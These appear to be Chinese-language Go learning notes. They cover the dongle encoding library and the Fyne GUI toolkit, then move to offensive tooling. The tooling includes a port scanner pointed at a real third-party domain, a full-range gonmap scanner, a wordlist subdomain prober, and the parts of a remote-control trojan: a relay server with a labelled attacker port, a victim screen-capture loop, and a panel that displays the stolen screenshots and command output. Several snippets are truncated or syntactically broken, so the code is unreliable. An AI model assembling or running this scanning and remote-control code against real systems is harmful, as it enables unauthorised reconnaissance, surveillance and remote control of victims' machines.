编码解码

go get -u github.com/dromara/dongle

提供两个加解密

加密：

dongle.Encode()和dongle.Encrypt()

解密：

dongle.Decode()和dongle.Decrypt()

Encode用于常见的加密，例如Base64等

Encrypt偏向密码学的加密，比如Md5和Aes

package main

import (
	"fmt"
	"github.com/dromara/dongle"
)

func main() {
	str := "1"
	s := dongle.Encode.FromString(str).ByBase64().String()
	fmt.Println(s)

	destd := "MQ=="
	s2 := dongle.Decode.FromString(destd).ByBase64().String()
	fmt.Println(s2)

	str1 := "1"
	//To用于原本不是这个类型转为这个类型，例如这里原本是字符串转为Hex
	s3 := dongle.Encrypt.FromString(str1).ByMd5().ToHexString()
	fmt.Println(s3)
}

fync(GUI)使用

  1. app.New()应用程序实例。负责管理整个应用的生命周期。

包含以下功能：

  • 主题管理：可以通过 a.Settings().SetTheme() 来设置主题。
  • 窗口管理：负责创建和管理窗口，例如 a.NewWindow()。
  • 应用退出：可以调用 a.Quit() 来关闭应用程序。

在 Fyne 中，一个应用可以包含多个窗口（w）。

  1. w := a.NewWindow("Hello")这里w代表应用程序中的一个窗口。

每个窗口是用户界面的一个独立显示区域，可以包含各种 UI 元素（如按钮、文本框等）。

  • 窗口的功能包括：
    • 内容设置：通过 w.SetContent(container) 来定义窗口内的内容。
    • 窗口大小调整：通过 w.Resize() 设置窗口大小。
    • 事件响应：窗口可以响应用户事件，比如关闭或最小化。

canvas

  • 代表：Fyne 中用于绘制和显示内容的基础图形层。
  1. canvas

它是 GUI 的核心渲染组件，用于将控件（如按钮、文本框）或图像渲染到屏幕上。

Canvas 中可以包含以下元素：

  • 控件（Widgets）：如按钮、文本框等 GUI 元素。
  • 图形元素：如线条、矩形、图像。
  • 层次化容器（Containers）：用于管理控件的布局和层次结构。
  1. widget是指用户界面中的控件组件，例如播放按钮，输入框，标签等

widget 是基于 canvas 的组件。

canvas 负责渲染所有的内容，包括 widget 和其他图形元素。

entry := widget.NewEntry()  // 创建一个输入框
button := widget.NewButton("点击", func() {
    fmt.Println("按钮被点击了！")
})
w.SetContent(container.NewVBox(entry, button)) // 将输入框和按钮添加到窗口内容中
  1. container 是用来布局和组织界面组件（如 widget 或 canvas 元素）的容器。

container 的功能：

  1. 布局管理：
    容器是布局的核心，它决定了界面中的控件如何排列。例如，垂直堆叠、水平排列或网格布局等。

  2. 组件组织：
    通过容器可以将多个组件组合在一起，形成一个逻辑结构。例如，将按钮、文本框、图片等放入一个容器中。

  3. 动态更新：
    容器的内容可以动态更新。例如，可以在用户点击按钮时更改容器内的内容。

package main

import (
	"bytes"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/canvas"
	"fyne.io/fyne/v2/theme"
	"github.com/kbinani/screenshot"
	"image/png"
)

// 返回截图图片的资源
func sc() []byte {
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {

		bounds := screenshot.GetDisplayBounds(i)
		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			continue
		}
		var buffer bytes.Buffer
		err = png.Encode(&buffer, img)
		if err != nil {
			return nil

		}

		return buffer.Bytes()

	}
	return nil
}

func main() {
	a := app.New()                           //新建实例
	a.Settings().SetTheme(theme.DarkTheme()) //SetTheme设置主题，theme.LightTheme(),是明亮主题;DarkTheme是黑暗主题
	w := a.NewWindow("哔哩哔哩")                 //新建窗口，参数标题

	go func() {
		for {
			resource := fyne.NewStaticResource("icon.", sc()) //嵌入资源
			image := canvas.NewImageFromResource(resource)
			w.SetContent(image) //设置内容
		}
	}()

	w.Resize(fyne.NewSize(1000, 700))
	//w.Show()                     //展示出来，需要run后显示窗口
	//a.Run()                      //可以直接ShowAndRun直接显示
	w.ShowAndRun()
}

import (

func scanner(port chan int, wg *sync.WaitGroup) {
	defer wg.Done()
	p := <-port
	_, err := net.Dial("tcp", fmt.Sprintf("www.baidu.com:%d", p))
	if err != nil {
		return
	}

	fmt.Printf("端口[%d]开放\n", p)

}

func main() {

	var wg sync.WaitGroup

		wg.Add(1)
		port <- i
		go scanner(port, &wg)

	}

	wg.Wait()

}

nmap包

gonmap是一个go语言的nmap端口扫描库，使用纯go实现nmap的扫描逻辑，而非调用nmap来进行扫描。

go get -u github.com/lcvvv/gonmap

package main

import (
    "github.com/fatih/color"
    "github.com/lcvvvv/gonmap"
    "sync"
)

var cout = color.New(color.FgGreen)

func scan(port int) {
    defer wg.Done()

    nmap := gonmap.New()
    status, response := nmap.Scan("127.0.0.1", port)

    if status.String() != "Matched" {  //端口开放返回Matched
       return
    }
    //FingerPrint.Service:指纹信息,Info详细信息
    cout.Println("[+]端口开放：", port, response.FingerPrint.Service, response.FingerPrint.Version, response.FingerPrint.,Info)

}

var wg sync.WaitGroup

func main() {
    for port := 1; port <= 65535; port++ {
       wg.Add(1)
       go scan(port)
    }

    wg.Wait()

}

存活探测

package main

import (
	"bytes"
	_ "embed"
	"flag"
	"fmt"
	"github.com/fatih/color"
	"github.com/parnurzeal/gorequest"
	"strings"
	"sync"
	"time"
)

//go:embed test.txt
var data string
var gree = color.New(color.FgGreen)
var domain string
var wg sync.WaitGroup
var current_url string
var thread int

func scan(ch chan string) {
	defer wg.Done()
	for x := range ch {

		http := fmt.Sprintf("http://%s", x)
		https := fmt.Sprintf("http://%s", x)

		request := gorequest.New()

		resp, _, err := request.Head(http).
			Timeout(3 * time.Second).
			End()

		//这里不能使用return，因为线程错误后会直接return掉，都return后就会堵塞掉
		if err != nil {
			goto HTTPS
		}

		//http的存活探测
		if resp.StatusCode == 200 || resp.StatusCode == 403 {
			gree.Println("[+]存活 —>", http)
			current_url = http
		}

	HTTPS:
		resp, _, err = request.Head(https).
			Timeout(3 * time.Second).
			End()

		//这里不能使用return，因为线程错误后会直接return掉，都return后就会堵塞掉
		if err != nil {
			continue
		}

		//https的存活探测
		if resp.StatusCode == 200 || resp.StatusCode == 403 {
			current_url = https
			gree.Println("[+]存活 —>", https)
		}

	}
}

func init() {
	flag.StringVar(&domain, "u", "", "要扫描的域名")
	flag.IntVar(&thread, "t", 10, "要开的线程数")
}

func main() {
	flag.Parse()
	if domain == "" {
		flag.Usage()
		return
	}

	if thread >= 1024 {
		thread = 1024
	}

	if thread <= 0 {
		return
	}

	ch := make(chan string, 1024)

	//开十个线程
	for i := 0; i < thread; i++ {
		wg.Add(1)
		go scan(ch)
	}

	//使用缓冲区读取文件，直接读取文件拼接可能存在bug
	var buffer bytes.Buffer

	buffer.WriteString(data)

	process := 0

	go func() {
		for {
			switch process % 4 {
			case 0:
				fmt.Print("\033[36m[/]\033[m")
			case 1:
				fmt.Print("\033[36m[-]\033[m")
			case 2:
				fmt.Print("\033[36m[\\]\033[m")
			case 3:
				fmt.Print("\033[36m[|]\033[m")
			}
			process += 1
			fmt.Printf("%s\r", current_url)
			time.Sleep(75 * time.Millisecond)
		}
	}()

	for {
		//内容的分隔符
		line, err := buffer.ReadString('\n')
		//读到最后报错直接跳出
		if err != nil {
			close(ch)
			break
		}

		//去除空格
		line = strings.TrimSpace(line)
		sprintf := fmt.Sprintf("%s.%s", line, domain)
		ch <- sprintf
	}
	wg.Wait()

}

package main

import (
    _ "embed"
    "fmt"
    "net"
)

func conn(c *net.Conn) {
    var buf [1024]byte
    for {
       n, err := (*c).Read(buf[:]) //从0开始到最大值
       if err != nil {
          continue
       }
       fmt.Println("客户端发送内容->", string(buf[:n]))
    }

}

func main() {
    listen, err := net.Listen("tcp", "0.0.0.0:8000")

    if err != nil {
       return
    }
    for {
       accept, err := listen.Accept()
       if err != nil {
          return
       }
       go conn(&accept)
    }

屏幕截图

go get -u github.com/kbinani/screenshot 。这是一个用于截取屏幕截图的库。

screenshot.Capture() 截取矩形截图
screenshot.CaptureRect() 截取矩形截图,用于获取分辨率后调用该函数
screenshot.NumActiveDisplays() 获取外接显示器
screenshot.GetDisplayBounds() 获取显示器的分辨率
screenshot.CaptureDisplay() 全屏截取某个显示器

底层都是调用screenshot.Capture()

package main

import (
	"fmt"
	"net"
)

type Conn struct {
	ClientConn  *net.Conn //客户端  多个可用数组
	ControlConn *net.Conn //攻击者
}

const ClientListenPort string = "0.0.0.0:6666"
const ControlListenPort string = "0.0.0.0:50050"

var C *Conn

// 监听控制端
func (c *Conn) ListenControl() {
	listen, err := net.Listen("tcp", ControlListenPort)
	if err != nil {
		return
	}
	for {
		accept, err := listen.Accept()
		if err != nil {
			continue
		}
		C.ControlConn = &accept
		C.DoControl()

	}

}

// 监听客户端
func (c *Conn) ListenClient() {
	listen, err := net.Listen("tcp", ClientListenPort)
	if err != nil {
		return
	}
	for {
		accept, err := listen.Accept()
		if err != nil {
			continue
		}
		C.ClientConn = &accept
		C.DoClient()
	}
}

// 客户端请求管理
func (c *Conn) DoClient() {
	var buf [1024 * 1024 * 10]byte
	for {
		n, err := (*c.ClientConn).Read(buf[:])
		if err != nil {
			fmt.Println("Client connection closed:", err)
			c.ClientConn = nil // 清理客户端连接
			return             // 退出当前循环，等待新的客户端连接
		}

		_, err = (*c.ControlConn).Write(buf[:n])
		if err != nil {
			continue
		}

	}
}

// 控制端请求管理
func (c *Conn) DoControl() {
	var buf [1024 * 1024 * 10]byte
	for {
		n, err := (*c.ControlConn).Read(buf[:])
		if err != nil {
			//continue
			fmt.Println("Control connection closed:", err)
			c.ControlConn = nil // 清理控制端连接
			return              // 退出当前循环，等待新的控制端连接
		}
		_, err = (*c.ClientConn).Write(buf[:n])
		if err != nil {
			continue
		}

	}

}

func main() {

	C = &Conn{}
	go C.ListenControl()
	go C.ListenClient()

	select {} //阻塞使不退出
}

func ReadConn(conn *net.Conn, a fyne.App, entry *widget.Entry) {
	var buf [1024 * 1024 * 10]byte
	for {
		n, err := (*conn).Read(buf[:])
		if err != nil {
			continue
		}
		if n > 2048 {
			resource := fyne.NewStaticResource("png", buf[:])     //将缓冲区中的数据（buf[:n]）创建为fyne.StaticResourc对象
			fromResource := canvas.NewImageFromResource(resource) //将StaticResource转换为可以显示在fyne窗口中的图像对象。
			//container.NewMax(fromResource)：创建一个容器，内部包含图像 fromResource，并将其填充整个窗口。
			//windows.SetContent：将窗口内容设置为新的容器，动态更新窗口显示的图像。

			fromResource.FillMode = canvas.ImageFillContain //以图片原本大小显示
			w := a.NewWindow("截屏")
			w.SetContent(fromResource)
			w.CenterOnScreen()
			w.Show()
			continue

		} else {
			data, err := ioutil.ReadAll(transform.NewReader(bytes.NewBuffer(buf[:n]), simplifiedchinese.GBK.NewDecoder()))
			if err != nil {
				entry.SetText(err.Error())
			}
			entry.SetText(string(data))
		}

		continue

	}

}
func WriteConn(conn *net.Conn, ch chan string) {

	for x := range ch {
		_, err := (*conn).Write([]byte(x))

		}
	}

}

func (c *customTheme) Color(name fyne.ThemeColorName, variant fyne.ThemeVariant) color.Color {
	if name == theme.ColorNameBackground {
		return color.RGBA{R: 40, G: 40, B: 40, A: 255} // 深灰色背景
	}
	if name == theme.ColorNameInputBackground {
		return color.RGBA{R: 60, G: 60, B: 60, A: 255} // 浅黑色输入框
	}
	if name == theme.ColorNamePlaceHolder {
		return color.RGBA{R: 200, G: 200, B: 200, A: 255} // 占位符为浅灰色
	}
	if name == theme.ColorNameDisabled {
		return color.RGBA{R: 50, G: 50, B: 50, A: 255} // 浅黑色
	}
	if name == theme.ColorNameForeground {
		return color.RGBA{R: 255, G: 255, B: 255, A: 255} // 输入文字为白色
	}
	if name == theme.ColorNameForeground {
		return color.RGBA{R: 255, G: 255, B: 255, A: 255} // 文本为白色
	}
	return c.base.Color(name, variant)
}
